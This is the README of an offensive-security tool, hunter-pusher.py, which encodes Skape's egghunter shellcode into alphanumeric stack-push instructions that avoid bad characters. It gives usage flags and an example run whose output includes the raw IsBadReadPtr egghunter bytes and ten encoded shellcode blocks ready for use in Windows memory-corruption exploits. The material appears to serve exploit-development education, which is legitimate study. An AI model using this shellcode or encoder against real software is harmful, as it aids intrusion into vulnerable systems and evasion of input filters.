## hunter-pusher.py
**hunter-pusher.py** is an experimental alphanumeric egghunter encoder. This tool allows the user to generate one of several egghunters listed in Skape's (Matt Miller's) <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf" target="_blank">paper</a> titled, _Safely Searching Process Virtual Address Space_, with several customization options. These options include user-defined padding bytes, tag, and bad characters to exclude.  

The output is formatted in blocks to represent the manipulation of the **eax** register reproducing four bytes of the chosen egghunter at a time. This egghunter encoding technique is used in situations where the attacker's raw egghunter is corrupted in memory. Details are covered in this Corelan <a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" target="_blank">article</a> and piggybacked in a personal <a href="https://datkev.github.io/page/building-an-alphanumeric-encoder-part-1" target="_blank">blog post</a>.

Feedback is always welcome.



# Usage
```
usage: hunter-pusher.py [-h] [-b BAD CHARS] [-e #] [-p PAD] [-t TAG]

Alphanumeric egghunter stack pusher

optional arguments:
  -h, --help            show this help message and exit
  -b BAD CHARS, --bad BAD CHARS
                        Bad characters to exclude in payload
                        e.g. '\x00\xb4\xd9'
                        Default: Non-alphanumeric characters
  -e #, --egghunter #   Specific egghunter to encode:
                        0: Windows - SEH - 60 bytes
                        1: Windows - IsBadReadPtr - 40 bytes
                        2: Windows - NtDisplayString - 32 bytes
                        3: Windows - NtAccessCheckAndAuditAlarm - 32 bytes
                        4: Linux - access(2) - 40 bytes
                        5: Linux - access(2) revisited - 36 bytes
                        6: Linux - sigaction(2) - 32 bytes
                        Default: 2
  -p PAD, --pad PAD     Byte to pad egghunter with before encoding
                        e.g. '\x90'
                        Default: \x90
  -t TAG, --tag TAG     Four byte tag that egghunter will search for
                        e.g. 'w00t'
                        Default: w00t
```



# Example

**./hunter-pusher.py -b '\x00\x0a\x0d\xd3\xad\xb3\x3f\xff' -e 1 -p '\x41' -t 'w00t'**

These flags specify the generation of an **IsBadReadPtr** egghunter padded with "\x41", using a tag "w00t".
Bad characters as specified by the user will be excluded from the egghunter and will not appear in the _raw form_ (after blocks are pushed onto the stack).

```
Raw egghunter bytes: 33DB6681CBFF0F436A0853B80D5BE777FFD085C075ECB8773030748BFBAF75E7AF75E4FFE7414141

******BLOCK 0*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x5d\x3d\x3e\x3e
\x2d\x5e\x40\x40\x40
\x2d\x5e\x40\x40\x40
\x50
******BLOCK 1*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x70\x2d\x5e\x55
\x2d\x70\x2e\x5e\x55
\x2d\x71\x2e\x5f\x55
\x50
******BLOCK 2*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x57\x6f\x2d\x5d
\x2d\x57\x70\x2e\x5d
\x2d\x57\x70\x2e\x5e
\x50
******BLOCK 3*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x45\x45\x2e\x26
\x2d\x45\x45\x2e\x27
\x2d\x46\x45\x2f\x27
\x50
******BLOCK 4*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x2e\x5b\x6c\x2d
\x2d\x2e\x5c\x6d\x2d
\x2d\x2f\x5c\x6d\x2d
\x50
******BLOCK 5*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x55\x64\x28\x6a
\x2d\x56\x65\x28\x6a
\x2d\x56\x65\x29\x6b
\x50
******BLOCK 6*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x51\x36\x5d\x2d
\x2d\x51\x37\x5d\x2d
\x2d\x51\x37\x5e\x2d
\x50
******BLOCK 7*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x32\x52\x39\x6d
\x2d\x32\x52\x39\x6d
\x2d\x32\x53\x3a\x6d
\x50
******BLOCK 8*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x67\x55\x4f\x3e
\x2d\x67\x55\x50\x3e
\x2d\x67\x55\x50\x40
\x50
******BLOCK 9*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x44\x61\x32\x2a
\x2d\x44\x61\x33\x2a
\x2d\x45\x62\x33\x2a
\x50
```



# Credits
This tool uses a Python translation of <a href="https://github.com/gap-system/gap/blob/master/lib/combinat.gi" target="_blank">combinat.gi</a> from <a href="https://www.gap-system.org/index.html" target="_blank">GAP</a>, an open-source system for computational discrete algebra used in research and teaching.



# Creation Process
The creation of **hunter-pusher.py** is documented in the Building an Alphanumeric Encoder series at: <a href="https://datkev.github.io" target="_blank">https://datkev.github.io</a>

<a href="https://datkev.github.io/page/building-an-alphanumeric-encoder-part-3" target="_blank">Part 3</a> of the series is dedicated to code logic.
